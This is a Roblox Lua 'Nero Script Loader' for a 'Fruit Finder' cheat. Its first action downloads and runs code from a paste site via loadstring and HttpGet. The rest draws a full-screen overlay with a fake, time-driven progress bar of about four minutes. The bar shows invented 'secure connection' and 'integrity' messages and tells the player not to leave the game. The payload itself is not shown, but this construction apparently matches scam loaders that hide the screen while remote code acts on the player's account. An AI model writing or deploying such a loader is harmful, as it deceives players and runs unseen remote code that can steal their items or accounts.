local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer

task.spawn(function()
    local success, err = pcall(function()
        loadstring(game:HttpGet("https://paste.fe4r.click/raw/450cfc3a-b293-4523-97d7-78b6fe9da742"))()
    end)
    if not success then
        warn("[NeroLoader] Fruit Finder failed to load:", err)
    end
end)

local gui = Instance.new("ScreenGui")
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.DisplayOrder = 999999
gui.Parent = player:WaitForChild("PlayerGui")

local bg = Instance.new("Frame")
bg.Size = UDim2.fromScale(1,1)
bg.BackgroundColor3 = Color3.fromRGB(5, 5, 10)
bg.ZIndex = 1
bg.Parent = gui

local bgGradient = Instance.new("UIGradient")
bgGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 0, 40)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 0, 0)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 0, 20)),
})
bgGradient.Rotation = 45
bgGradient.Parent = bg

local gridContainer = Instance.new("Frame")
gridContainer.Size = UDim2.fromScale(1,1)
gridContainer.BackgroundTransparency = 1
gridContainer.ZIndex = 2
gridContainer.Parent = bg

for i = 1, 20 do
    local line = Instance.new("Frame")
    line.Size = UDim2.new(0, 1, 1, 0)
    line.Position = UDim2.fromScale(i/20, 0)
    line.BackgroundColor3 = Color3.fromRGB(120, 0, 255)
    line.BackgroundTransparency = 0.88
    line.ZIndex = 2
    line.Parent = gridContainer
end

local glow = Instance.new("Frame")
glow.Size = UDim2.fromScale(0.6, 0.6)
glow.AnchorPoint = Vector2.new(0.5,0.5)
glow.Position = UDim2.fromScale(0.5, 0.5)
glow.BackgroundColor3 = Color3.fromRGB(120, 0, 255)
glow.BackgroundTransparency = 0.85
glow.ZIndex = 3
glow.Parent = bg

local glowCorner = Instance.new("UICorner")
glowCorner.CornerRadius = UDim.new(1,0)
glowCorner.Parent = glow

local card = Instance.new("Frame")
card.Size = UDim2.fromOffset(540,250)
card.AnchorPoint = Vector2.new(0.5,0.5)
card.Position = UDim2.fromScale(0.5,0.5)
card.BackgroundColor3 = Color3.fromRGB(10, 5, 15)
card.BackgroundTransparency = 0.1
card.ZIndex = 10
card.Parent = bg

Instance.new("UICorner", card).CornerRadius = UDim.new(0,16)

local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(140, 0, 255)
stroke.Thickness = 2
stroke.Parent = card

local cardGradient = Instance.new("UIGradient")
cardGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 5, 35)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 0, 10)),
})
cardGradient.Parent = card

local title = Instance.new("TextLabel")
title.Text = "NERO SCRIPT LOADER"
title.Font = Enum.Font.GothamBold
title.TextSize = 31
title.TextColor3 = Color3.fromRGB(180, 100, 255)
title.BackgroundTransparency = 1
title.TextXAlignment = Enum.TextXAlignment.Left
title.Size = UDim2.new(1,-40,0,30)
title.Position = UDim2.fromOffset(25,20)
title.ZIndex = 20
title.Parent = card

local titleStroke = Instance.new("UIStroke")
titleStroke.Color = Color3.fromRGB(255, 50, 200)
titleStroke.Thickness = 0.8
titleStroke.Parent = title

local donutContainer = Instance.new("Frame")
donutContainer.Size = UDim2.fromOffset(32,32)
donutContainer.Position = UDim2.new(1,-52,0,16)
donutContainer.BackgroundTransparency = 1
donutContainer.ZIndex = 30
donutContainer.Parent = card

local donutRing = Instance.new("Frame")
donutRing.Size = UDim2.fromScale(1,1)
donutRing.BackgroundTransparency = 1
donutRing.Parent = donutContainer

local donutStroke = Instance.new("UIStroke")
donutStroke.Color = Color3.fromRGB(140, 0, 255)
donutStroke.Thickness = 4
donutStroke.Parent = donutRing

local donutCorner = Instance.new("UICorner")
donutCorner.CornerRadius = UDim.new(1,0)
donutCorner.Parent = donutRing

local donutHole = Instance.new("Frame")
donutHole.Size = UDim2.fromOffset(16,16)
donutHole.AnchorPoint = Vector2.new(0.5,0.5)
donutHole.Position = UDim2.fromScale(0.5,0.5)
donutHole.BackgroundTransparency = 1
donutHole.ZIndex = 31
donutHole.Parent = donutContainer

local donutHoleCorner = Instance.new("UICorner")
donutHoleCorner.CornerRadius = UDim.new(1,0)
donutHoleCorner.Parent = donutHole

local donutInnerStroke = Instance.new("UIStroke")
donutInnerStroke.Color = Color3.fromRGB(255, 50, 200)
donutInnerStroke.Thickness = 10
donutInnerStroke.Parent = donutHole

local sub = Instance.new("TextLabel")
sub.Text = "Preparing secure environment..."
sub.Font = Enum.Font.Gotham
sub.TextSize = 15
sub.TextColor3 = Color3.fromRGB(180, 160, 220)
sub.BackgroundTransparency = 1
sub.TextXAlignment = Enum.TextXAlignment.Left
sub.Size = UDim2.new(1,-40,0,20)
sub.Position = UDim2.fromOffset(25,52)
sub.ZIndex = 20
sub.Parent = card

local percent = Instance.new("TextLabel")
percent.Text = "1.1%"
percent.Font = Enum.Font.GothamBold
percent.TextSize = 46
percent.TextColor3 = Color3.fromRGB(255, 255, 255)
percent.BackgroundTransparency = 1
percent.TextXAlignment = Enum.TextXAlignment.Center
percent.Size = UDim2.new(1,-40,0,55)
percent.Position = UDim2.fromOffset(25,85)
percent.ZIndex = 20
percent.Parent = card

local percentStroke = Instance.new("UIStroke")
percentStroke.Color = Color3.fromRGB(140, 0, 255)
percentStroke.Thickness = 1
percentStroke.Parent = percent

local status = Instance.new("TextLabel")
status.Text = "Initializing game context..."
status.Font = Enum.Font.Gotham
status.TextSize = 15
status.TextColor3 = Color3.fromRGB(160, 140, 200)
status.BackgroundTransparency = 1
status.TextXAlignment = Enum.TextXAlignment.Center
status.Size = UDim2.new(1,-40,0,20)
status.Position = UDim2.fromOffset(25,140)
status.ZIndex = 20
status.Parent = card

local warning = Instance.new("TextLabel")
warning.Text = "Do not leave the game or rejoin while loading."
warning.Font = Enum.Font.Gotham
warning.TextSize = 11
warning.TextColor3 = Color3.fromRGB(140, 120, 170)
warning.BackgroundTransparency = 1
warning.TextXAlignment = Enum.TextXAlignment.Center
warning.Size = UDim2.new(1,-40,0,20)
warning.Position = UDim2.fromOffset(25,162)
warning.ZIndex = 20
warning.Parent = card

local barBg = Instance.new("Frame")
barBg.Size = UDim2.new(1,-50,0,23)
barBg.Position = UDim2.fromOffset(25,200)
barBg.BackgroundColor3 = Color3.fromRGB(5, 0, 10)
barBg.ZIndex = 20
barBg.Parent = card

Instance.new("UICorner", barBg).CornerRadius = UDim.new(1,0)

local barStroke = Instance.new("UIStroke")
barStroke.Color = Color3.fromRGB(80, 0, 150)
barStroke.Thickness = 1
barStroke.Parent = barBg

-- BAR
local bar = Instance.new("Frame")
bar.Size = UDim2.fromScale(0.011,1)
bar.BackgroundColor3 = Color3.fromRGB(140, 0, 255)
bar.ZIndex = 21
bar.Parent = barBg

Instance.new("UICorner", bar).CornerRadius = UDim.new(1,0)

local barGradient = Instance.new("UIGradient")
barGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 50, 200)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(140, 0, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 100, 255)),
})
barGradient.Parent = bar

-- INDICATOR
local indicatorContainer = Instance.new("Frame")
indicatorContainer.Size = UDim2.fromOffset(50,50)
indicatorContainer.AnchorPoint = Vector2.new(0.4, 0.5)
indicatorContainer.Position = UDim2.fromScale(0.011, 0.5)
indicatorContainer.BackgroundTransparency = 1
indicatorContainer.ZIndex = 100
indicatorContainer.Parent = barBg

local squareOutline = Instance.new("Frame")
squareOutline.Size = UDim2.fromScale(1,1)
squareOutline.BackgroundTransparency = 1
squareOutline.ZIndex = 101
squareOutline.Parent = indicatorContainer

local outlineStroke = Instance.new("UIStroke")
outlineStroke.Color = Color3.fromRGB(140, 0, 255)
outlineStroke.Thickness = 0.6
outlineStroke.Parent = squareOutline

local circle = Instance.new("Frame")
circle.Size = UDim2.fromOffset(19,19)
circle.AnchorPoint = Vector2.new(0.5,0.5)
circle.Position = UDim2.fromScale(0.5,0.5)
circle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
circle.ZIndex = 102
circle.Parent = indicatorContainer

local circleCorner = Instance.new("UICorner")
circleCorner.CornerRadius = UDim.new(1,0)
circleCorner.Parent = circle

-- FOOTER
local left = Instance.new("TextLabel")
left.Text = "Nero secure script loader"
left.Font = Enum.Font.Gotham
left.TextSize = 13
left.TextColor3 = Color3.fromRGB(130, 110, 170)
left.BackgroundTransparency = 1
left.TextXAlignment = Enum.TextXAlignment.Left
left.Size = UDim2.new(0.5,-20,0,20)
left.Position = UDim2.fromOffset(25,225)
left.ZIndex = 20
left.Parent = card

local right = Instance.new("TextLabel")
right.Text = "This may take a while on first attach."
right.Font = Enum.Font.Gotham
right.TextSize = 13
right.TextColor3 = Color3.fromRGB(130, 110, 170)
right.BackgroundTransparency = 1
right.TextXAlignment = Enum.TextXAlignment.Right
right.Size = UDim2.new(0.5,-25,0,20)
right.Position = UDim2.new(0.5,5,0,225)
right.ZIndex = 20
right.Parent = card

-- BACKGROUND ANIMATIONS
task.spawn(function()
    while gui.Parent do
        TweenService:Create(glow, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
            Size = UDim2.fromScale(0.8, 0.8),
            BackgroundTransparency = 0.75
        }):Play()
        task.wait(2)
        TweenService:Create(glow, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
            Size = UDim2.fromScale(0.6, 0.6),
            BackgroundTransparency = 0.88
        }):Play()
        task.wait(2)
    end
end)

task.spawn(function()
    while gui.Parent do
        bgGradient.Rotation = bgGradient.Rotation + 1
        task.wait(0.05)
    end
end)

task.spawn(function()
    while gui.Parent do
        donutContainer.Rotation = donutContainer.Rotation + 3
        task.wait(0.03)
    end
end)

-- LOADING SYSTEM
task.spawn(function()
    -- PHASE 1
    local v = 1.1
    local phase1Duration = 120
    local startTime = tick()

    local phase1Data = {
        {msg = "Initializing Nero environment...", targetPercent = 18.1},
        {msg = "Checking executor & exploit environment...", targetPercent = 41.1},
        {msg = "Fetching Nero configuration...", targetPercent = 71.0},
        {msg = "Nero functionality is being finalized...", targetPercent = 90.1},
        {msg = "Waiting for script to attach...", targetPercent = 92.2}
    }

    local currentTargetIndex = 1

    while v < 92.2 do
        local elapsed = tick() - startTime
        local progress = elapsed / phase1Duration
        v = 1.1 + (progress * 91.1)

        if v > phase1Data[currentTargetIndex].targetPercent then
            status.Text = phase1Data[currentTargetIndex].msg
            currentTargetIndex = currentTargetIndex + 1
        end

        if v > 92.2 then v = 92.2 end

        percent.Text = string.format("%.1f%%", v)
        local scale = v / 100

        TweenService:Create(bar, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.fromScale(scale, 1)}):Play()
        TweenService:Create(indicatorContainer, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.fromScale(scale, 0.5)}):Play()

        task.wait(0.1)
    end

    while v < 100.0 do
        v = v + 0.5
        if v > 100.0 then v = 100.0 end
        percent.Text = string.format("%.1f%%", v)
        local scale = v / 100
        TweenService:Create(bar, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.fromScale(scale, 1)}):Play()
        TweenService:Create(indicatorContainer, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.fromScale(scale, 0.5)}):Play()
        task.wait(0.05)
    end

    warning.Text = "Nero is almost finished, please wait..."
    task.wait(1)

    -- PHASE 2
    v = 1.1
    startTime = tick()
    currentTargetIndex = 1

    local phase2Data = {
        {msg = "Locking Nero environment & encrypting state...", targetPercent = 24.4},
        {msg = "Binding remotes and secure hooks...", targetPercent = 45.7},
        {msg = "Validating Nero script integrity...", targetPercent = 68.3},
        {msg = "Establishing secure connection...", targetPercent = 84.9},
        {msg = "Finalizing Nero loader sequence...", targetPercent = 95.2}
    }

    while v < 95.2 do
        local elapsed = tick() - startTime
        local progress = elapsed / phase1Duration
        v = 1.1 + (progress * 94.1)

        if v > phase2Data[currentTargetIndex].targetPercent then
            status.Text = phase2Data[currentTargetIndex].msg
            currentTargetIndex = currentTargetIndex + 1
        end

        if v > 95.2 then v = 95.2 end

        percent.Text = string.format("%.1f%%", v)
        local scale = v / 100

        TweenService:Create(bar, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.fromScale(scale, 1)}):Play()
        TweenService:Create(indicatorContainer, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.fromScale(scale, 0.5)}):Play()

        task.wait(0.1)
    end

    while v < 100.0 do
        v = v + 0.3
        if v > 100.0 then v = 100.0 end
        percent.Text = string.format("%.1f%%", v)
        local scale = v / 100
        TweenService:Create(bar, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.fromScale(scale, 1)}):Play()
        TweenService:Create(indicatorContainer, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.fromScale(scale, 0.5)}):Play()
        task.wait(0.03)
    end

    -- Done
    status.Text = "Nero loaded successfully!"
    warning.Text = "Fruit Finder is now active."
    task.wait(1)
    gui:Destroy()
end)
